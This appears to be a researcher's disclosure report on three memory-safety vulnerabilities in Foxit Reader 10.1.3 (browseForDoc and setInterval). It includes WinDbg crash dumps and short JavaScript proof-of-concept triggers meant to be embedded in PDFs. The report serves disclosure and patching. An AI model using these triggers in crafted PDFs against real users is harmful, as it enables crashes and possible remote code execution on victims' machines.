# CVE

```
https://www.zerodayinitiative.com/advisories/ZDI-21-561/	   Anonymous
https://www.foxitsoftware.com/support/security-bulletins.html  mnhFly
```

# Details

## 1.FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x29ac6e

```
1.	Vulnerability Title
  	FoxitReader browseForDoc OUT-OF-BOUNDS WRITE Remote Code Execution Vulnerability
2.	High-level overview of the vulnerability and the possible effect of using it
	The affected product is vulnerable to an out-of-bounds write while processing pdf files, allowing an attacker to craft a special pdf file that may permit arbitrary code execution.
3.	Exact product that was found to be vulnerable including complete version information
	FoxitReader 10.1.3.37598
4.	Root Cause Analysis (recommended but not required)
	This is a out-of-bounds-write Vulnerability.
	This vulnerability also affects Foxit PhantomPDF.
	This is windbg's backtrace:

    (89c.112c): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=3de73ffc ebx=1b860ff8 ecx=00000298 edx=00001238 esi=3de73d64 edi=40047000
    eip=03bd35ae esp=06d9e11c ebp=06d9e1e8 iopl=0         nv up ei pl nz na pe cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for FoxitReader.exe - 
    FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x29ac6e:
    03bd35ae f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
    0:000> dd edi
    40047000  ???????? ???????? ???????? ????????
    40047010  ???????? ???????? ???????? ????????
    40047020  ???????? ???????? ???????? ????????
    40047030  ???????? ???????? ???????? ????????
    40047040  ???????? ???????? ???????? ????????
    40047050  ???????? ???????? ???????? ????????
    40047060  ???????? ???????? ???????? ????????
    40047070  ???????? ???????? ???????? ????????
    0:000> dd esi
    3de73d64  ae2ad3c4 4b05c7d9 329d17eb f5242dbf
    3de73d74  0bc800ae 00e3a6e9 2aea6fab 93ed28d5
    3de73d84  d9ab4fe4 becec1eb 4b00b6b8 a0f8000a
    3de73d94  00ebfece 268400ad 004cfcef 313d6ee7
    3de73da4  2c7d66fc 32ae8db1 c20b98bf 6bed0059
    3de73db4  7c4d005a 002bae0a 0079b633 62251c3a
    3de73dc4  ce2366ae e3027a64 8dcbd4e3 00a103e3
    3de73dd4  3d8dccab 70f5000d 00d6ef60 9f41e1f1
    0:000> kv
    ChildEBP RetAddr  Args to Child              
    WARNING: Stack unwind information not available. Following frames may be wrong.
    06d9e1e8 0108e965 324ecff8 06d9e26c 06d9e21c FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x29ac6e
    06d9e244 02ac016b 324ecff8 06d9e274 06d9e26c FoxitReader!CryptUIWizExport+0x3b0c5
    06d9e28c 02c85e59 3f55de60 45435dc1 06d9e40c FoxitReader!FXJSE_GetClass+0x22b
    06d9e2e0 02c855ef 06d9e328 45435dc1 06d9e410 FoxitReader!CFXJSE_Arguments::GetValue+0x1c5729
    06d9e374 02c858b1 06d9e3a8 3f55de60 06d9e400 FoxitReader!CFXJSE_Arguments::GetValue+0x1c4ebf
    06d9e3bc 02c8574b 06d9e3d4 00000006 06d9e410 FoxitReader!CFXJSE_Arguments::GetValue+0x1c5181
    06d9e3d8 02e2cdf7 00000006 06d9e410 3f55de60 FoxitReader!CFXJSE_Arguments::GetValue+0x1c501b
    06d9e3f4 02dbb730 38f00275 45436e15 0000000c FoxitReader!CFXJSE_Arguments::GetValue+0x36c6c7
    06d9e43c 02db92bf 4144e955 48d10011 00000022 FoxitReader!CFXJSE_Arguments::GetValue+0x2fb000
    06d9e450 02db90db 00000000 00000000 00000002 FoxitReader!CFXJSE_Arguments::GetValue+0x2f8b8f
    06d9e47c 02af65c6 3f55de60 38f00275 48d10011 FoxitReader!CFXJSE_Arguments::GetValue+0x2f89ab
    06d9e540 02af60a7 06d9e630 3f55de60 06d9e598 FoxitReader!CFXJSE_Arguments::GetValue+0x35e96
    06d9e5c0 02ae33a7 06d9e630 3f55de60 3dc2e020 FoxitReader!CFXJSE_Arguments::GetValue+0x35977
    06d9e67c 02abe8bf 06d9e704 3dc2e03c def823e3 FoxitReader!CFXJSE_Arguments::GetValue+0x22c77
    06d9e6f4 02abf0d4 3dc2e020 3dd0eff8 3dc2e010 FoxitReader!FXJSE_Runtime_Release+0xc4f
    06d9e708 011b6e22 3e092fd8 3dd9ecec 3dd0eff8 FoxitReader!FXJSE_ExecuteScript+0x14
    06d9e774 011b7c3d 00000000 06d9e7f0 06d9e79c FoxitReader!CryptUIWizExport+0x163582
    06d9e784 00e14d7d 06d9e7f0 17bc8fe8 00000000 FoxitReader!CryptUIWizExport+0x16439d
    06d9e79c 00e129ef 20384dd8 00000015 43cc0f58 FoxitReader!std::basic_ios<char,std::char_traits<char> >::fill+0x27fb0d
    06d9e7d8 00831913 06d9e80c 00000015 302aefa8 FoxitReader!std::basic_ios<char,std::char_traits<char> >::fill+0x27d77f
    06d9e828 00a355b8 def83127 7fffffff 00a35560 FoxitReader!google::LogMessageVoidify::operator&+0x5663
    06d9f430 0394a60c 00000000 00000000 def83017 FoxitReader!std::basic_ostream<char,std::char_traits<char> >::put+0x5a158
    06d9f500 0394b7e5 00000429 00000000 00000000 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x11ccc
    06d9f524 0394618b 00000429 00000000 00000000 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x12ea5
    06d9f598 039469fe 2651ce20 000c05aa 00000429 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0xd84b
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\USER32.dll - 
    06d9f5b8 7567ef5b 000c05aa 00000429 00000000 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0xe0be
    06d9f5e4 75675eca 039469ca 000c05aa 00000429 USER32!AddClipboardFormatListener+0x4b
    06d9f6c8 75673c3a 039469ca 00000000 00000429 USER32!GetClassLongW+0x7aa
    06d9f73c 75673a00 00000329 06d9f764 009ca0c4 USER32!DispatchMessageW+0x24a
    06d9f748 009ca0c4 0ee3aec8 0ee3aec8 0550c2f0 USER32!DispatchMessageW+0x10
    06d9f764 009ca183 0550c2f0 009ca0f0 ffffffff FoxitReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0xe9b64
    06d9f784 03e3e51a 00000000 055384e4 06e0c000 FoxitReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0xe9c23
    06d9f79c 03b2debf 006b0000 00000000 0989af1e FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x505bda
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\KERNEL32.DLL - 
    06d9f7e8 7721fa29 06e0c000 7721fa10 06d9f854 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x1f557f
    06d9f7f8 774d7c7e 06e0c000 8c8f8ec0 00000000 KERNEL32!BaseThreadInitThunk+0x19
    06d9f854 774d7c4e ffffffff 774f88aa 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0x11e
    06d9f864 00000000 03b2df8e 06e0c000 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0xee
    
5.	Proof-of-Concept
	javascript code:
	var oRetn = app.browseForDoc({ bSave: true, cFilenameInit: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cFSInit: "CHTTP", }); 

  	Use FoxitReader open  FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x29ac6e.pdf
6.	Software Download Link
  	https://www.foxitsoftware.com/pdf-reader/
```

## 2.KERNELBASE!PathRemoveBlanksW+0x32

```
1.	Vulnerability Title
  	FoxitReader browseForDoc OUT-OF-BOUNDS READ Remote Code Execution Vulnerability
2.	High-level overview of the vulnerability and the possible effect of using it
	The affected product is vulnerable to an out-of-bounds READ while processing pdf files, allowing an attacker to craft a special pdf file that may permit arbitrary code execution.
3.	Exact product that was found to be vulnerable including complete version information
	FoxitReader 10.1.3.37598
4.	Root Cause Analysis (recommended but not required)
	This is a out-of-bounds-read Vulnerability.
	This vulnerability also affects Foxit PhantomPDF.
	Please open PageHeap on FoxitReader.exe,also case zzdiFlyy0019.
	This is windbg's backtrace:

    (19b0.2ac): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=0000c0c0 ebx=00000000 ecx=2e16cffe edx=0000c0c0 esi=2e16d000 edi=00000020
    eip=76fc40f2 esp=06dccffc ebp=06dcd004 iopl=0         nv up ei pl nz ac pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\KERNELBASE.dll - 
    KERNELBASE!PathRemoveBlanksW+0x32:
    76fc40f2 0fb706          movzx   eax,word ptr [esi]       ds:002b:2e16d000=????
    0:000> dd esi
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\COMDLG32.dll - 
    2e16d000  ???????? ???????? ???????? ????????
    2e16d010  ???????? ???????? ???????? ????????
    2e16d020  ???????? ???????? ???????? ????????
    2e16d030  ???????? ???????? ???????? ????????
    2e16d040  ???????? ???????? ???????? ????????
    2e16d050  ???????? ???????? ???????? ????????
    2e16d060  ???????? ???????? ???????? ????????
    2e16d070  ???????? ???????? ???????? ????????
    0:000> kv
    ChildEBP RetAddr  Args to Child              
    WARNING: Stack unwind information not available. Following frames may be wrong.
    06dcd004 76cecf58 2e16c060 00000000 76cad1b0 KERNELBASE!PathRemoveBlanksW+0x32
    06dcd030 76cef372 06dcd054 06dcd058 00000000 COMDLG32!PrintDlgA+0x159b8
    06dcd064 76ced0e8 186389a4 00000000 76ce5430 COMDLG32!PrintDlgA+0x17dd2
    06dcd094 76cec22a 001d0710 06dcd0dc 00000000 COMDLG32!PrintDlgA+0x15b48
    06dcd0c4 76ce6722 06dcd0dc 76ccc1f0 06dce1c0 COMDLG32!PrintDlgA+0x14c8a
    06dcd0f8 76cccf53 1d260060 06dce1c0 0000001f COMDLG32!PrintDlgA+0xf182
    06dcd120 76ccd81d 2e16c060 775595bb 00000001 COMDLG32!Ssync_ANSI_UNICODE_Struct_For_WOW+0x37a3
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for FoxitReader.exe - 
    06dce1a0 010b3484 06dce1c0 cfdab3e0 1119aff8 COMDLG32!GetSaveFileNameW+0x5d
    06dce260 0108e965 1119aff8 06dce2e4 06dce294 FoxitReader!CryptUIWizExport+0x5fbe4
    06dce2bc 02ac016b 1119aff8 06dce2ec 06dce2e4 FoxitReader!CryptUIWizExport+0x3b0c5
    06dce304 02c85e59 42130e60 46835dc1 06dce484 FoxitReader!FXJSE_GetClass+0x22b
    06dce358 02c855ef 06dce3a0 46835dc1 06dce488 FoxitReader!CFXJSE_Arguments::GetValue+0x1c5729
    06dce3ec 02c858b1 06dce420 42130e60 06dce478 FoxitReader!CFXJSE_Arguments::GetValue+0x1c4ebf
    06dce434 02c8574b 06dce44c 00000006 06dce488 FoxitReader!CFXJSE_Arguments::GetValue+0x1c5181
    06dce450 02e2cdf7 00000006 06dce488 42130e60 FoxitReader!CFXJSE_Arguments::GetValue+0x1c501b
    06dce46c 02dbb730 40080275 46836e15 0000000c FoxitReader!CFXJSE_Arguments::GetValue+0x36c6c7
    06dce4b4 02db92bf 400ce955 4688ee0d 00000022 FoxitReader!CFXJSE_Arguments::GetValue+0x2fb000
    06dce4c8 02db90db 00000000 00000000 00000002 FoxitReader!CFXJSE_Arguments::GetValue+0x2f8b8f
    06dce4f4 02af65c6 42130e60 40080275 4688ee0d FoxitReader!CFXJSE_Arguments::GetValue+0x2f89ab
    06dce5b8 02af60a7 06dce6a8 42130e60 06dce610 FoxitReader!CFXJSE_Arguments::GetValue+0x35e96
    06dce638 02ae33a7 06dce6a8 42130e60 428fb020 FoxitReader!CFXJSE_Arguments::GetValue+0x35977
    06dce6f4 02abe8bf 06dce77c 428fb03c cfdab6ec FoxitReader!CFXJSE_Arguments::GetValue+0x22c77
    06dce76c 02abf0d4 428fb020 1eb22ff8 428fb010 FoxitReader!FXJSE_Runtime_Release+0xc4f
    06dce780 011b6e22 14712fd8 1eafaf6c 1eb22ff8 FoxitReader!FXJSE_ExecuteScript+0x14
    06dce7ec 011b7c3d 00000000 06dce868 06dce814 FoxitReader!CryptUIWizExport+0x163582
    06dce7fc 00e14d7d 06dce868 17c00fe8 00000000 FoxitReader!CryptUIWizExport+0x16439d
    06dce814 00e129ef 2f370dd8 00000015 34648f58 FoxitReader!std::basic_ios<char,std::char_traits<char> >::fill+0x27fb0d
    06dce850 00831913 06dce884 00000015 2ffbefa8 FoxitReader!std::basic_ios<char,std::char_traits<char> >::fill+0x27d77f
    06dce8a0 00a355b8 cfdaa528 7fffffff 00a35560 FoxitReader!google::LogMessageVoidify::operator&+0x5663
    06dcf4a8 0394a60c 00000000 00000000 cfdaa4f8 FoxitReader!std::basic_ostream<char,std::char_traits<char> >::put+0x5a158
    06dcf578 0394b7e5 00000429 00000000 00000000 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x11ccc
    06dcf59c 0394618b 00000429 00000000 00000000 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x12ea5
    06dcf610 039469fe 2f4cae20 004306f4 00000429 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0xd84b
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\USER32.dll - 
    06dcf630 7567ef5b 004306f4 00000429 00000000 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0xe0be
    06dcf65c 75675eca 039469ca 004306f4 00000429 USER32!AddClipboardFormatListener+0x4b
    06dcf740 75673c3a 039469ca 00000000 00000429 USER32!GetClassLongW+0x7aa
    06dcf7b4 75673a00 00000329 06dcf7dc 009ca0c4 USER32!DispatchMessageW+0x24a
    06dcf7c0 009ca0c4 0edd2ec8 0edd2ec8 0550c2f0 USER32!DispatchMessageW+0x10
    06dcf7dc 009ca183 0550c2f0 009ca0f0 ffffffff FoxitReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0xe9b64
    06dcf7fc 03e3e51a 00000000 055384e4 06f54000 FoxitReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0xe9c23
    06dcf814 03b2debf 006b0000 00000000 098daf1e FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x505bda
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\KERNEL32.DLL - 
    06dcf860 7721fa29 06f54000 7721fa10 06dcf8cc FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x1f557f
    06dcf870 774d7c7e 06f54000 509dce96 00000000 KERNEL32!BaseThreadInitThunk+0x19
    06dcf8cc 774d7c4e ffffffff 774f88d4 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0x11e
    06dcf8dc 00000000 03b2df8e 06f54000 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0xee

5.	Proof-of-Concept
	javascript code:
	var oRetn = app.browseForDoc({ bSave: true, cFilenameInit: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", cFSInit: "CHTTP", }); 

  	Use FoxitReader open  KERNELBASE!PathRemoveBlanksW+0x32.pdf
6.	Software Download Link
  	https://www.foxitsoftware.com/pdf-reader/
```

## 3.FoxitReader!CFXJSE_Arguments::GetValue+0x27b90

```
1.	Vulnerability Title
  	FoxitReader setInterval OUT-OF-BOUNDS READ Remote Code Execution Vulnerability
2.	High-level overview of the vulnerability and the possible effect of using it
	The affected product is vulnerable to an out-of-bounds READ while processing pdf files, allowing an attacker to craft a special pdf file that may permit arbitrary code execution.
3.	Exact product that was found to be vulnerable including complete version information
	FoxitReader 10.1.3.37598
4.	Root Cause Analysis (recommended but not required)
	This is a out-of-bounds-read Vulnerability.
	This vulnerability also affects Foxit PhantomPDF.
	Please open PageHeap on FoxitReader.exe.
	This is windbg's backtrace:

    (d44.15f0): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00000000 ebx=40f72e60 ecx=268d9fb0 edx=00000001 esi=ffffffff edi=06dcf984
    eip=02ae82c0 esp=06dcf8d0 ebp=06dcf8d0 iopl=0         nv up ei ng nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
    FoxitReader!CFXJSE_Arguments::GetValue+0x27b90:
    02ae82c0 8a08            mov     cl,byte ptr [eax]          ds:002b:00000000=??
    0:000> dd eax
    00000000  ???????? ???????? ???????? ????????
    00000010  ???????? ???????? ???????? ????????
    00000020  ???????? ???????? ???????? ????????
    00000030  ???????? ???????? ???????? ????????
    00000040  ???????? ???????? ???????? ????????
    00000050  ???????? ???????? ???????? ????????
    00000060  ???????? ???????? ???????? ????????
    00000070  ???????? ???????? ???????? ????????
    0:000> kv
    ChildEBP RetAddr  Args to Child              
    WARNING: Stack unwind information not available. Following frames may be wrong.
    06dcf8d0 02ae00e6 00000000 41208fd8 19006f10 FoxitReader!CFXJSE_Arguments::GetValue+0x27b90
    06dcf914 02abe7fc 268d9fb0 40f72e60 00000000 FoxitReader!CFXJSE_Arguments::GetValue+0x1f9b6
    06dcf998 02abf0d4 00000000 205deff8 00000000 FoxitReader!FXJSE_Runtime_Release+0xb8c
    06dcf9ac 011b6e22 41208fd8 00000000 205deff8 FoxitReader!FXJSE_ExecuteScript+0x14
    06dcfa18 011b7c3d 00000000 06dcfa78 06dcfa3c FoxitReader!CryptUIWizExport+0x163582
    06dcfa28 010ade74 06dcfa78 324a8fd0 38336fd0 FoxitReader!CryptUIWizExport+0x16439d
    06dcfa3c 010ae19c 133d6f58 06dcfa78 ead5cdc7 FoxitReader!CryptUIWizExport+0x5a5d4
    06dcfa70 0107731c 20314ff0 00000000 00000113 FoxitReader!CryptUIWizExport+0x5a8fc
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\USER32.dll - 
    06dcfa84 7567ef5b 00000000 00000113 0000482d FoxitReader!CryptUIWizExport+0x23a7c
    06dcfab0 75671b42 010772b0 00000000 00000113 USER32!AddClipboardFormatListener+0x4b
    06dcfb7c 75673cf3 010772b0 00000000 00000113 USER32!EnumChildWindows+0x162
    06dcfbe8 75673a00 00000013 06dcfc10 009ca0c4 USER32!DispatchMessageW+0x303
    06dcfbf4 009ca0c4 0efc6ec8 0efc6ec8 0550c2f0 USER32!DispatchMessageW+0x10
    06dcfc10 009ca183 0550c2f0 009ca0f0 ffffffff FoxitReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0xe9b64
    06dcfc30 03e3e51a 00000000 055384e4 06fbc000 FoxitReader!std::basic_ostream<char,std::char_traits<char> >::operator<<+0xe9c23
    06dcfc48 03b2debf 006b0000 00000000 0a94af1e FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x505bda
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\WINDOWS\SysWOW64\KERNEL32.DLL - 
    06dcfc94 7721fa29 06fbc000 7721fa10 06dcfd00 FoxitReader!FPDFSCRIPT3D_OBJ_BoundingBox__Method_ToString+0x1f557f
    06dcfca4 774d7c7e 06fbc000 0ea5f9f7 00000000 KERNEL32!BaseThreadInitThunk+0x19
    06dcfd00 774d7c4e ffffffff 774f88b4 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0x11e
    06dcfd10 00000000 03b2df8e 06fbc000 00000000 ntdll!RtlGetAppContainerNamedObjectPath+0xee

5.	Proof-of-Concept
	javascript code:
	var ckMouse = app.setInterval("\\uda2d", 100);  

  	Use FoxitReader open  FoxitReader!CFXJSE_Arguments::GetValue+0x27b90.pdf
6.	Software Download Link
  	https://www.foxitsoftware.com/pdf-reader/
```

